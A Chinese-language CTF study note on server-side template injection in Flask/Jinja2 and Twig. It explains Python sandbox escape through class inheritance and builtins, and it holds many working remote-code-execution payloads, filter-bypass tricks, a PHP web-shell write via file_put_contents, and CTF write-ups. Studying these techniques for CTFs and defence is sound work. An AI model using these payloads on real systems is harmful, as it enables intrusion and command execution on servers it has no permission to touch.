## SSTI

+++

又名沙盒逃逸

## 原理

<font color='red'>**本节以python为例，后面会每个语言都分析一番**</font>

原理与sql注入类似，我们输入的字符串带入代码后变成了程序的一部分

漏洞成因在于：render_template函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，{{}}在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{{}}包裹的内容当做变量解析替换。比如{{1+1}}会被解析成2。

![img](D:\Typora\note\CTF\web\ctfshow_vip\SSTI.assets\watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70.png)

具体原因无需过于了解

### **沙盒/沙箱**

沙箱在早期主要用于测试可疑软件，测试病毒危害程度等等。在沙箱中运行，即使病毒对其造成了严重危害，也不会威胁到真实环境，沙箱重构也十分便捷。有点类似虚拟机的利用。

沙箱逃逸,就是在给我们的一个代码执行环境下,脱离种种过滤和限制,最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。而我们这里主要讲解的是python环境下的沙箱逃逸。

要讲解python沙箱逃逸，首先就有必要来深入了解一下python的一些**基础知识！**

### **内建函数**

当我们启动一个python解释器时，及时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。

内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。

名称空间在python是个非常重要的概念，它是从名称到对象的映射，而在python程序的执行过程中，至少会存在两个名称空间

> 内建名称空间：python自带的名字，在python解释器启动时产生，存放一些python内置的名字
>
> 全局名称空间：在执行文件时，存放文件级别定义的名字
>
> 局部名称空间（可能不存在）：在执行文件的过程中，如果调用了函数，则会产生该函数的名称空间，用来存放该函数内定义的名字，该名字在函数调用时生效，调用结束后失效

```php
加载顺序：内置名称空间------>全局名称空间----->局部名称空间
名字的查找顺序：局部名称空间------>全局名称空间----->内置名称空间
```

我们主要关注的是内建名称空间，是名字到内建对象的映射，在python中，初始的**builtins**模块提供内建名称空间到内建对象的映射
**dir()**函数用于向我们展示一个对象的属性有哪些，在没有提供对象的时候，将会提供当前环境所导入的所有模块，我们可以看到初始模块有哪些

![image-20220901101226680](D:\Typora\note\CTF\web\ctfshow_vip\SSTI.assets\image-20220901101226680.png)

`__builtins__`是做为默认初始模块出现的，那么我们可以看看`__builtins__`的组成

![image-20220901101436073](D:\Typora\note\CTF\web\ctfshow_vip\SSTI.assets\image-20220901101436073.png)

这里可以看到很多熟悉的函数，这也就是为什么我们在没有任何模块时也可以使用函数的原因
所以我们可以用**import**导入模块，也是python解释器事先加载了的

### 类继承

python中对一个变量应用**class**方法从一个变量实例转到对应的对象类型后，类有以下三种关于继承关系的方法

```php
__base__ //对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法

__mro__ //同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，object在最底层故在列表中的最后，通过__mro__[-1]可以获取到

__subclasses__() //继承此对象的子类，返回一个列表
```

有这些类继承的方法，我们就可以从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类，就可以获得到很多的类啦。

**魔术函数**

这里介绍几个常见的魔术函数，有助于后续的理解

- `__dict__`类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里的对象的__dict__中存储了一些self.xxx的一些东西内置的数据类型没有__dict__属性每个类有自己的__dict__属性，就算存在继承关系，父类的__dict__ 并不会影响子类的__dict__对象也有自己的__dict__属性， 存储self.xxx 信息，父子类对象公用__dict__

- `__globals__`该属性是函数特有的属性,记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用**globals**属性访问全局的变量。该属性保存的是函数全局变量的**字典**引用。

- `__getattribute__()`实例、类、函数都具有的`__getattribute__`魔术方法。事实上，在实例化的对象进行`.`操作的时候（形如：`a.xxx/a.xxx()`），都会自动去调用`__getattribute__`方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。

#### 基？

```python
__class__            类的一个内置属性，表示实例对象的类。
 
__base__             类型对象的直接基类
 
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
 
__mro__              method resolution order，即解析方法调用的顺序；此属性是由类组成的元            组，在方法解析期间会基于它来查找基类。
 
__subclasses__()     返回这个类的子类集合，每个类都保留一个对其直接子类的弱引用列表。该方法返回一个列表，其中包含所有仍然存在的引用。列表按照定义顺序排列。
 
__init__             初始化类，返回的类型是function
 
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
 
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
 
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
 
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
 
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
 
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
 
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
 
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。
 
request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
 
request.args.x1   	 get传参
 
request.values.x1 	 所有参数
 
request.cookies      cookies参数
 
request.headers      请求头参数
 
request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
 
request.data  		 post传参	(Content-Type:a/b)
 
request.json		 post传json  (Content-Type: application/json)
 
config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
 
g                    {{g}}得到<flask.g of 'flask_ssti'>
```

#### 常用过滤器

```python
int()：将值转换为int类型；
 
float()：将值转换为float类型；
 
lower()：将字符串转换为小写；
 
upper()：将字符串转换为大写；
 
title()：把值中的每个单词的首字母都转成大写；
 
capitalize()：把变量值的首字母转成大写，其余字母转小写；
 
trim()：截取字符串前面和后面的空白字符；
 
wordcount()：计算一个长字符串中单词的个数；
 
reverse()：字符串反转；
 
replace(value,old,new)： 替换将old替换为new的字符串；
 
truncate(value,length=255,killwords=False)：截取length长度的字符串；
 
striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；
 
escape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。
 
safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；
 
list()：将变量列成列表；
 
string()：将变量转换成字符串；
 
join()：将一个序列中的参数值拼接成字符串。示例看上面payload；
 
abs()：返回一个数值的绝对值；
 
first()：返回一个序列的第一个元素；
 
last()：返回一个序列的最后一个元素；
 
format(value,arags,*kwargs)：格式化字符串。比如：{{ "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!
 
length()：返回一个序列或者字典的长度；
 
sum()：返回列表内数值的和；
 
sort()：返回排序后的列表；
 
default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。
 
length()返回字符串的长度，别名是count
```



### 利用

这些听起来很抽象，不妨来看看一个实例场景

**在python下，不使用open来打开一个文件**

```shell
xlccccc@xl-pc:/ctf/web$ python2
Python 2.7.18 (default, Jul  1 2022, 12:27:04)
[GCC 9.4.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
#变量abc的类型是type
>>> 'abc'.__class__

<type 'str'>
#由str型获取对象的基类，显示出整个继承链的关系，对象object在最后，所以可由[-1]得到([2]当然也可以啦)
#或者"".__class__.__bases__ 也可以得到 object
>>> ''.__class__.__mro__
(<type 'str'>, <type 'basestring'>, <type 'object'>)

''["__cla""ss__"]["__m""ro__"][-1]["__subclasses__()


#继承于对象的子类，返回一个列表
>>> ''.__class__.__mro__[-1].__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
#方便查阅
>>> for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i
...
(0, <type 'type'>)
(1, <type 'weakref'>)
(2, <type 'weakcallableproxy'>)
(3, <type 'weakproxy'>)
(4, <type 'int'>)
(5, <type 'basestring'>)
(6, <type 'bytearray'>)
(7, <type 'list'>)
(8, <type 'NoneType'>)
(9, <type 'NotImplementedType'>)
(10, <type 'traceback'>)
(11, <type 'super'>)
(12, <type 'xrange'>)
(13, <type 'dict'>)
(14, <type 'set'>)
(15, <type 'slice'>)
(16, <type 'staticmethod'>)
(17, <type 'complex'>)
(18, <type 'float'>)
(19, <type 'buffer'>)
(20, <type 'long'>)
(21, <type 'frozenset'>)
(22, <type 'property'>)
(23, <type 'memoryview'>)
(24, <type 'tuple'>)
(25, <type 'enumerate'>)
(26, <type 'reversed'>)
(27, <type 'code'>)
(28, <type 'frame'>)
(29, <type 'builtin_function_or_method'>)
(30, <type 'instancemethod'>)
(31, <type 'function'>)
(32, <type 'classobj'>)
(33, <type 'dictproxy'>)
(34, <type 'generator'>)
(35, <type 'getset_descriptor'>)
(36, <type 'wrapper_descriptor'>)
(37, <type 'instance'>)
(38, <type 'ellipsis'>)
(39, <type 'member_descriptor'>)
(40, <type 'file'>)
(41, <type 'PyCapsule'>)
(42, <type 'cell'>)
(43, <type 'callable-iterator'>)
(44, <type 'iterator'>)
(45, <type 'sys.long_info'>)
(46, <type 'sys.float_info'>)
(47, <type 'EncodingMap'>)
(48, <type 'fieldnameiterator'>)
(49, <type 'formatteriterator'>)
(50, <type 'sys.version_info'>)
(51, <type 'sys.flags'>)
(52, <type 'exceptions.BaseException'>)
(53, <type 'module'>)
(54, <type 'imp.NullImporter'>)
(55, <type 'zipimport.zipimporter'>)
(56, <type 'posix.stat_result'>)
(57, <type 'posix.statvfs_result'>)
(58, <class 'warnings.WarningMessage'>)
(59, <class 'warnings.catch_warnings'>)
(60, <class '_weakrefset._IterationGuard'>)
(61, <class '_weakrefset.WeakSet'>)
(62, <class '_abcoll.Hashable'>)
(63, <type 'classmethod'>)
(64, <class '_abcoll.Iterable'>)
(65, <class '_abcoll.Sized'>)
(66, <class '_abcoll.Container'>)
(67, <class '_abcoll.Callable'>)
(68, <type 'dict_keys'>)
(69, <type 'dict_items'>)
(70, <type 'dict_values'>)
(71, <class 'site._Printer'>)
(72, <class 'site._Helper'>)
(73, <type '_sre.SRE_Pattern'>)
(74, <type '_sre.SRE_Match'>)
(75, <type '_sre.SRE_Scanner'>)
(76, <class 'site.Quitter'>)
(77, <class 'codecs.IncrementalEncoder'>)
(78, <class 'codecs.IncrementalDecoder'>)
#可以看到第四十个为file，file则存在open方法，直接读文件
>>> ''.__class__.__mro__[-1].__subclasses__()[40]("/ctf/web/test.py").read()

```

![img](D:\Typora\note\CTF\web\ctfshow_vip\SSTI.assets\t01d9c0f9b077bcec4a.png)

可以看到用法与**open**一样

**所以遇到SSTI的题，应该先看看什么框架，再去看看配置文件获取足够的信息了就拿相应的payload打就好了**

## 如何挖掘命令执行

用SSTI，python内置的函数固然有用，但最好用的还是shell，那么该如何在题目环境中找到需要的**os**函数呢

```python
#python2
num = 0
for item in ''.__class__.__mro__[-1].__subclasses__():
    try:
        if 'os' in item.__init__.__globals__:
            print num,item
        num+=1
    except:
        num+=1

xlccccc@xl-pc:/ctf/web/ssti$ python2 python2OS.py 
71 <class 'site._Printer'>
76 <class 'site.Quitter'>
>>> ''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
app.py  hack.php  pay.py  phar  ssti  test.py  try.py
>>> ''.__class__.__mro__[2].__subclasses__()[76].__init__.__globals__['os'].system('ls')
app.py  hack.php  pay.py  phar  ssti  test.py  try.py
```

查阅资料发现访问os模块还有从warnings.catch_warnings模块入手的，而这两个模块分别位于元组中的59，60号元素。`__init__`方法用于将对象实例化，在这个函数下我们可以通过funcglobals（或者`__globals`）看该模块下有哪些globals函数（注意返回的是字典），而linecache可用于读取任意一个文件的某一行，而这个函数引用了os模块。

于是还可以挖掘到类似payload（注意payload都不是直接套用的，不同环境请自行测试）

```
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('ls')
[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('ls')
```

我们除了知道了linecache、os可以获取到命令执行的函数以外，我们前面还提到了一个`__builtins__`内建函数，在python的内建函数中我们也可以获取到诸如eval等执行命令的函数。于是我们可以改动一下脚本，看看python2还有哪些payload可以用：

补充一下关于`__builtin__`和`__builtins__`的区别：[传送门](https://www.cnblogs.com/Ladylittleleaf/p/10240096.html)

```py
#python2
num = 0
for item in ''.__class__.__mro__[-1].__subclasses__():
    #print item
    try:
        if item.__init__.__globals__.keys():

            if '__builtins__' in  item.__init__.__globals__.keys():
                print(num,item,'__builtins__')
            if  'os' in  item.__init__.__globals__.keys():
                print(num,item,'os')
            if  'linecache' in  item.__init__.__globals__.keys():
                print(num,item,'linechache')

        num+=1
    except:
        num+=1

        
xlccccc@xl-pc:/ctf/web/ssti$ python2 python2OS.py 
(58, <class 'warnings.WarningMessage'>, '__builtins__')
(58, <class 'warnings.WarningMessage'>, 'linechache')
(59, <class 'warnings.catch_warnings'>, '__builtins__')
(59, <class 'warnings.catch_warnings'>, 'linechache')
(60, <class '_weakrefset._IterationGuard'>, '__builtins__')
(61, <class '_weakrefset.WeakSet'>, '__builtins__')
(71, <class 'site._Printer'>, '__builtins__')
(71, <class 'site._Printer'>, 'os')
(76, <class 'site.Quitter'>, '__builtins__')
(76, <class 'site.Quitter'>, 'os')
(77, <class 'codecs.IncrementalEncoder'>, '__builtins__')
(78, <class 'codecs.IncrementalDecoder'>, '__builtins__')

利用方法形如
{{[].__class__.__base__.__subclasses__()[58].__init__.func_globals['linecache'].os.popen('whoami').read()}}

或者直接这样？？原理不懂 #建议x换成url_for
{{x.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
{{x.__globals__.__builtins__.eval("__import__('os').popen('cat /flag').read()")}}
{{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
url_for这个可以用来构造url，接受函数名作为第一个参数 与get_flashed_message()类似
所以{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
和
{{get_flashed_message.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
是必成的，x有点玄学，有时候不行

python2遇到的奇特的类<class 'subprocess.Popen'> 直接RCE
{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
```

**所以SSTI考的就是对payload的收集以及在题目环境下的挖掘和`bypass`**

## python3

常见的类

```python
search='popen'
num=-1
for i in ().__class__.__mro__[-1].__subclasses__():
    num+=1
    try:
        if search in i.__init__.__globals__.keys():
            print(i,num)
    except:
        pass

本地环境！题目环境需要另外测试
<class 'os._wrap_close'> 132
"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()

popen换为__import__
<class '_frozen_importlib._ModuleLock'> 80
<class '_frozen_importlib._DummyModuleLock'> 81
<class '_frozen_importlib._ModuleLockManager'> 82
<class '_frozen_importlib.ModuleSpec'> 83
{{"".__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__import__('os').popen('whoami').read()}}
```



## bypass

bypass遇到题目后再来细讲和补充

> 利用 **request.args.x1**   **request.cookie.x1**   **request.values.x1**来bypass

> 利用`config的__str__`数组得到想要的字符来bypass
>
> ```python
> (config.__str__()[2])%2B(config.__str__()[42]) <==> 'os'
> ```
>
> 包括但不局限于config

> 先把chr函数找出来，再用chr函数拼接
>
> ```python
> {% set chr=url_for.__globals__.__builtins__.chr %}{{chr(111)%2bchr(115)}}  <==>  'os'
> ```
>
> 好用是因为找**chr**的过程没用多少特殊字符

> attr用于获取变量
>
> ```python
> ""|attr("__class__")   <==>  "".__class__   #注意哦 是带 . 的  所以 _ 和 . 被过滤都可以用它来bypass
> ```
>
> 而这个里面还能套request，那么操作空间就很大了

> {{ }} 与 {% %}的区别是后者没有回显，所以加一个**print**就一样啦

还有一些很厉害的bypass技巧在ctfshow里面的题都用到且细致的解释了就不在这边重复放了
下面就放一些刷题过程中遇到的新思路吧

## 常见通用payload

```
{{x.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
or
{{x.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")}}
or
{{url_for.__globals__.os.popen('cat /flag').read()}} 这种方法的特点是不需要中括号
#遇到一题前面必须要是 url_for 不理解
or
{{x.__init__.__globals__.__getitem__('__builtins__').eval('__import__('os').popen('cat /flag').read()')}}
同上不需要中括号
or
{{lipsum.__globals__['os'].popen('cat /flag').read()}}
#也可用于得到__builtins__
```



## 参考链接

[SSTI/沙盒逃逸详细总结](https://www.anquanke.com/post/id/188172)

[y4_SSTI模板注入及绕过姿势(基于Python-Jinja2)](https://blog.csdn.net/solitudi/article/details/107752717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166199766616780357264175%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=166199766616780357264175&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-107752717-null-null.nonecase&utm_term=ssti&spm=1018.2226.3001.4450)

[yu22x_SSTI模板注入绕过(进阶篇)](https://blog.csdn.net/miuzzx/article/details/110220425?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166201977016781647565661%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=166201977016781647565661&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-110220425-null-null.nonecase&utm_term=ssti&spm=1018.2226.3001.4450)

[合天网安师傅讲的很详细](https://blog.csdn.net/qq_38154820/article/details/111399386)

[ SSTI(模板注入)漏洞(入门篇)](https://www.cnblogs.com/bmjoker/p/13508538.html)

[flask文档](https://flask.net.cn/)

## 例题

<font color='red'>**此处只放一些典型的题目或者知识点含量多的题**</font>

### [WesternCTF2018]shrine

直接给出了源码

```python
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/shrine/<path:shrine>')
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))


if __name__ == '__main__':
    app.run(debug=True)

```

很明显前面说了**FLAG**是放在配置文件中

在**shrine**路由中，接受了一个`<path:shrine>`参数，并且将该参数的值给了函数**safe_jinja**，该函数中对传入的参数过滤了空格并设有黑名单，黑名单是看是不是只有**config**或者**self**`for c in blacklist`，

![image-20220903000714633](D:\Typora\note\CTF\web\ctfshow_vip\SSTI.assets\image-20220903000714633.png)

我的理解就是这样的，经测试也确实是这样的
那按理说得到**config**有两种常规方式
`{{config}}  {{self.__dict__}}`那为什么第二种不行呢？😶‍🌫️

第三种办法就是找到全局变量`current_app`然后读他的config
`{{url_for.__globals__}}`或者`{{get_flashed_messages.__globals__}}`

![image-20220903001039774](D:\Typora\note\CTF\web\ctfshow_vip\SSTI.assets\image-20220903001039774.png)

然后`{{url_for.__globals__['current_app'].config}}`

![image-20220903001146044](D:\Typora\note\CTF\web\ctfshow_vip\SSTI.assets\image-20220903001146044.png)

得到flag

### [BJDCTF2020]Cookie is so stable

![image-20220914084519362](D:\Typora\note\CTF\web\ctfshow_vip\SSTI.assets\image-20220914084519362.png)

感觉像是SSTI，可以试试

![image-20220914084601225](D:\Typora\note\CTF\web\ctfshow_vip\SSTI.assets\image-20220914084601225.png)

果然，接下来就是找模板

![img](D:\Typora\note\CTF\web\ctfshow_vip\SSTI.assets\c52b16c0b3e8637ac80d318c2d9c9f6.jpg)

这张图可以参考一下

输入`{{7*'7'}}`返回**49**，可知不是**Jinja2就是Twig**，因为文件是php，所以只能是**Twig**

所以去网上找payload

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("ls")}}

{{["whoami"]|map("system")}}

{{["whoami"]|map("passthru")}}

{{["whoami"]|map("exec")}}    // 无回显

但是当上面的都被ban了呢，我们还有没有其他方法rce

当然，例如

file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] ) : int
当我们找到路径后就可以利用该函数进行写shell了

?name={{{"<?php phpinfo();eval($_POST[whoami]);":"D:\\phpstudy_pro\\WWW\\shell.php"}|map("file_put_contents")}}
```

https://www.freebuf.com/articles/web/314028.html

特别详细的payload讲解





